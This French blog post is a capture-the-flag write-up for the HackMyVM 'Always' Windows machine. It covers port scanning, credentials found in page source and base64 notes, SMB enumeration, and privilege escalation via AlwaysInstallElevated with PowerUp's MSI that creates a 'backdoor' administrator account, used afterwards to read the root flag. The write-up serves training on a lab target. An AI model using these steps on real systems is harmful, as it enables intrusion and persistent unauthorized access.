---
title: "Solution du CTF Always de HackMyVM.eu"
tags: [CTF,HackMyVM,Windows]
---

### C'est physique, mais virtuel (PoV: tu dates une gameuse)

Le CTF `Always` proposé sur HackMyVM.eu est assez inhabituel, dans le mauvais sens du terme, mais il permet de pratiquer ses compétences de pénétration de systèmes Windows, alors on dit pas non.

```console
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
8080/tcp  open  http         Apache httpd 2.4.57 ((Win64))
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.57: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
--- snip ---
|       CVE-2024-39884  6.2     https://vulners.com/cve/CVE-2024-39884
|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
|_      CVE-2024-36387  5.4     https://vulners.com/cve/CVE-2024-36387
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|_  /Admin/: Possible admin folder
|_http-server-header: Apache/2.4.57 (Win64)
|_http-trace: TRACE is enabled
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:18:5E:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: ALWAYS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
```

Nmap a détecté la présence d'un dossier `/admin`. Il y a une page d'index dessus et j'ai tout de suite été surpris par la présence d'un nom de fichier HTML dans le champ `action` du formulaire de login présent.

L'explication n'était que quelques lignes dessous puisqu'on peut voir une vérification de mot de passe côté client :

```html
    <div class="container">
        <h2>Login</h2>
        <form id="loginForm" action="admin_notes.html" method="POST" onsubmit="return validateForm()">
            <input type="text" id="username" name="username" placeholder="Username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="error" id="errorMessage"></div>
        <div class="footer">2024 Always Corp. All Rights Reserved.</div>
    </div>

    <script>
        function validateForm() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const errorMessage = document.getElementById("errorMessage");


            if (username === "admin" && password === "adminpass123") {
                return true; 
            }

            errorMessage.textContent = "Invalid Username Or Password!";
            return false; 
        }
    </script>
```

Si on saisit les identifiants attendus, on est redirigé vers `admin_notes.html`, page sur laquelle on trouve un identifiant en base 64 : `ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=` qui se décode en  `ftpuser:KeepGoingBro!!!`.

Cet utilisateur est valide sur le service FTP, mais pas que : ça marche aussi avec SMB.

```console
$ nxc smb 192.168.56.108 -u ftpuser -p 'KeepGoingBro!!!' --shares
SMB         192.168.56.108  445    ALWAYS-PC        [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True) 
SMB         192.168.56.108  445    ALWAYS-PC        [+] Always-PC\ftpuser:KeepGoingBro!!! 
SMB         192.168.56.108  445    ALWAYS-PC        [*] Enumerated shares
SMB         192.168.56.108  445    ALWAYS-PC        Share           Permissions     Remark
SMB         192.168.56.108  445    ALWAYS-PC        -----           -----------     ------
SMB         192.168.56.108  445    ALWAYS-PC        ADMIN$                          Uzak Yönetici
SMB         192.168.56.108  445    ALWAYS-PC        C$                              Varsayılan değer
SMB         192.168.56.108  445    ALWAYS-PC        IPC$                            Uzak IPC
$ nxc smb 192.168.56.108 -u ftpuser -p 'KeepGoingBro!!!' --users
SMB         192.168.56.108  445    ALWAYS-PC        [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True) 
SMB         192.168.56.108  445    ALWAYS-PC        [+] Always-PC\ftpuser:KeepGoingBro!!! 
SMB         192.168.56.108  445    ALWAYS-PC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         192.168.56.108  445    ALWAYS-PC        Administrator                 2024-09-30 19:15:28 0       Bilgisayarı/etki alanını yönetmede kullanılan önceden tanımlı hesap 
SMB         192.168.56.108  445    ALWAYS-PC        Always                        2024-10-01 19:36:02 0        
SMB         192.168.56.108  445    ALWAYS-PC        ftpuser                       2024-09-30 19:25:29 0        
SMB         192.168.56.108  445    ALWAYS-PC        Guest                         <never>             1       Bilgisayara/etki alanına konuk erişiminde kullanılan önceden tanımlı hesap 
SMB         192.168.56.108  445    ALWAYS-PC        [*] Enumerated 4 local users: Always-PC
```

Malgré tout, je n'arrive pas à avoir un shell puisque les partages sont en lecture seule.

Il nous reste alors le RDP en écoute :

```bash
xfreerdp /u:ftpuser '/p:KeepGoingBro!!!' /v:192.168.56.108
```

Mais cette fois, un message d'erreur en turc, indique que l'utilisateur ne fait pas partie des utilisateurs autorisés en connexion à distante...

Je suis donc allé fouiller ailleurs et tout ce que j'avais, c'était un fichier `robots.txt` trouvé sur la racine du FTP.

Malgré le nom du fichier, le dossier FTP ne partage aucune relation avec la racine web. Le fichier contient ceci :

```
User-agent: *
Disallow: /admins-secret-pagexxx.htm
```

On ouvre ce path sur le serveur Apache et on obtient un nouveau mot de passe :

```html
        <h2>Admin's Secret Notes</h2>
        <ul>
            <li>1) Disable the firewall and Windows Defender.</li>
            <li>2) Enable FTP and SSH.</li>
            <li>3) Start the Apache server.</li>
            <li>4) Don't forget to change the password for user 'always'. Current password is "WW91Q2FudEZpbmRNZS4hLiE=".</li>
        </ul>
```

Ça se décode en `YouCantFindMe.!.!`. Toutefois, le mot de passe ne fonctionne pas avec le compte `always` quelle que soit la méthode employée...

Il s'avère finalement qu'il fallait se connecter via la mire de Windows accessible via la fenêtre de l'émulateur, chose qui ne se fait généralement pas sur un CTF.

### NOPASSWD

Ça a été une sacrée galère à se connecter puisque le système est configuré en turc et que l'alphabet est différent. Heureusement le clavier virtuel de Windows et la présence du layout anglais secondaire ont (péniblement) aidé.

Bien qu'on se doute de l'issue de l'escalade de privilèges, on peut lancer un [winPEAS.bat](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASbat) qui nous confirmera notre intuition.

```
 [+] AlwaysInstallElevated?
   [i] If '1' then you can install a .msi file with admin privileges ;)
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Les installeurs sont effectiveness exécutés sans une demande UAC, un attaquant peut en profiter pour exécuter des tâches d'administration, ce que nous allons faire.

Pour cela, j'ai copié [le vieux PowerUp](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp) depuis un partage SMB que j'avais lancé via Docker. J'ai ensuite importé via Powershell le module et appellé la fonction `Write-UserAddMSI`.

```console
> Import-Module .\PowerUp.ps1
> Write-UserAddMSI
```

Cette dernière génère un exécutable `UserAdd.msi` dans le dossier courant. Malheureusement ce programme est graphique, mais ici, on dispose de l'accès RDP.

Cet outil demande un nom d'utilisateur et mot de passe puis ajoute un utilisateur privilégié sur le système. Ici, j'ai laissé les identifiants par défaut.

Une fois exécuté, on peut vérifier que le compte est créé :

```console
$ nxc smb 192.168.56.108 -u backdoor -p 'password123' -x "whoami /all"
SMB         192.168.56.108  445    ALWAYS-PC        [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True) 
SMB         192.168.56.108  445    ALWAYS-PC        [+] Always-PC\backdoor:password123 (Pwn3d!)
SMB         192.168.56.108  445    ALWAYS-PC        [+] Executed command via wmiexec
SMB         192.168.56.108  445    ALWAYS-PC        KULLANICI BÿLGÿLERÿ
SMB         192.168.56.108  445    ALWAYS-PC        -------------------
SMB         192.168.56.108  445    ALWAYS-PC        Kullanìcì adì      SID
SMB         192.168.56.108  445    ALWAYS-PC        ================== ============================================
SMB         192.168.56.108  445    ALWAYS-PC        always-pc\backdoor S-1-5-21-381724225-1041572993-564731166-1003
SMB         192.168.56.108  445    ALWAYS-PC        GRUP BÿLGÿLERÿ
SMB         192.168.56.108  445    ALWAYS-PC        --------------
SMB         192.168.56.108  445    ALWAYS-PC        Grup Adì                                                  Tür              SID          Öznitelikler
SMB         192.168.56.108  445    ALWAYS-PC        ========================================================= ================ ============ =========================================================================
SMB         192.168.56.108  445    ALWAYS-PC        Everyone                                                  ÿyi bilinen grup S-1-1-0      Zorunlu grup, Varsayìlan olarak etkin, Etkinleƒtirilmiƒ grup
SMB         192.168.56.108  445    ALWAYS-PC        NT AUTHORITY\Yerel hesap ve Administrators grubunun üyesi ÿyi bilinen grup S-1-5-114    Zorunlu grup, Varsayìlan olarak etkin, Etkinleƒtirilmiƒ grup
SMB         192.168.56.108  445    ALWAYS-PC        BUILTIN\Administrators                                    Diºer Ad         S-1-5-32-544 Zorunlu grup, Varsayìlan olarak etkin, Etkinleƒtirilmiƒ grup, Grup sahibi
SMB         192.168.56.108  445    ALWAYS-PC        BUILTIN\Users                                             Diºer Ad         S-1-5-32-545 Zorunlu grup, Varsayìlan olarak etkin, Etkinleƒtirilmiƒ grup
SMB         192.168.56.108  445    ALWAYS-PC        NT AUTHORITY\NETWORK                                      ÿyi bilinen grup S-1-5-2      Zorunlu grup, Varsayìlan olarak etkin, Etkinleƒtirilmiƒ grup
SMB         192.168.56.108  445    ALWAYS-PC        NT AUTHORITY\Authenticated Users                          ÿyi bilinen grup S-1-5-11     Zorunlu grup, Varsayìlan olarak etkin, Etkinleƒtirilmiƒ grup
SMB         192.168.56.108  445    ALWAYS-PC        NT AUTHORITY\This Organization                            ÿyi bilinen grup S-1-5-15     Zorunlu grup, Varsayìlan olarak etkin, Etkinleƒtirilmiƒ grup
SMB         192.168.56.108  445    ALWAYS-PC        NT AUTHORITY\Yerel hesap                                  ÿyi bilinen grup S-1-5-113    Zorunlu grup, Varsayìlan olarak etkin, Etkinleƒtirilmiƒ grup
SMB         192.168.56.108  445    ALWAYS-PC        NT AUTHORITY\NTLM Authentication                          ÿyi bilinen grup S-1-5-64-10  Zorunlu grup, Varsayìlan olarak etkin, Etkinleƒtirilmiƒ grup
SMB         192.168.56.108  445    ALWAYS-PC        Zorunlu Etiket\Yüksek Zorunlu Düzey                       Etiket           S-1-16-12288
SMB         192.168.56.108  445    ALWAYS-PC        AYRICALIK BÿLGÿLERÿ
SMB         192.168.56.108  445    ALWAYS-PC        ----------------------
SMB         192.168.56.108  445    ALWAYS-PC        Ayrìcalìk Adì                   Açìklama                                                 Durum
SMB         192.168.56.108  445    ALWAYS-PC        =============================== ======================================================== =====
SMB         192.168.56.108  445    ALWAYS-PC        SeIncreaseQuotaPrivilege        ÿƒlem için bellek kotalarì ayarla                        Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeSecurityPrivilege             Denetimi ve güvenlik günlüºünü yönet                     Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeTakeOwnershipPrivilege        Dosyalarìn veya diºer nesnelerin sahipliºini al          Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeLoadDriverPrivilege           Aygìt sürücüleri yükle ve kaldìr                         Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeSystemProfilePrivilege        Sistem performansì profili oluƒtur                       Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeSystemtimePrivilege           Sistem saatini deºiƒtir                                  Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeProfileSingleProcessPrivilege Tek iƒlem profili oluƒtur                                Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeIncreaseBasePriorityPrivilege Zamanlama önceliºini artìr                               Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeCreatePagefilePrivilege       Disk belleºi dosyasì oluƒtur                             Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeBackupPrivilege               Dosya ve dizinleri yedekle                               Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeRestorePrivilege              Dosya ve dizinleri geri yükle                            Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeShutdownPrivilege             Sistemi kapat                                            Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeDebugPrivilege                Programlarìn hatalarìnì ayìkla                           Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeSystemEnvironmentPrivilege    Üretici yazìlìmì ortam deºerlerini deºiƒtir              Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeChangeNotifyPrivilege         Çapraz geçiƒ denetimini atla                             Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeRemoteShutdownPrivilege       Uzak sistemden kapatmayì zorla                           Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeUndockPrivilege               Bilgisayarì takma biriminden çìkar                       Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeManageVolumePrivilege         Birim bakìm görevleri gerçekleƒtir                       Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeImpersonatePrivilege          Kimlik doºrulamasìndan sonra istemcinin özelliklerini al Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeCreateGlobalPrivilege         Genel nesneler oluƒtur                                   Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeIncreaseWorkingSetPrivilege   ÿƒlem çalìƒma kümesini artìr                             Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeTimeZonePrivilege             Saat dilimini deºiƒtir                                   Etkin
SMB         192.168.56.108  445    ALWAYS-PC        SeCreateSymbolicLinkPrivilege   Simgesel baºlantìlar oluƒtur                             Etkin
```

Et finalement obtenir le flag root :

```console
nxc smb 192.168.56.108 -u backdoor -p 'password123' -x "type c:\\users\\administrator\\desktop\\root.txt"
SMB         192.168.56.108  445    ALWAYS-PC        [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True) 
SMB         192.168.56.108  445    ALWAYS-PC        [+] Always-PC\backdoor:password123 (Pwn3d!)
SMB         192.168.56.108  445    ALWAYS-PC        [+] Executed command via wmiexec
SMB         192.168.56.108  445    ALWAYS-PC        HMV{White_Flag_Raised}
```
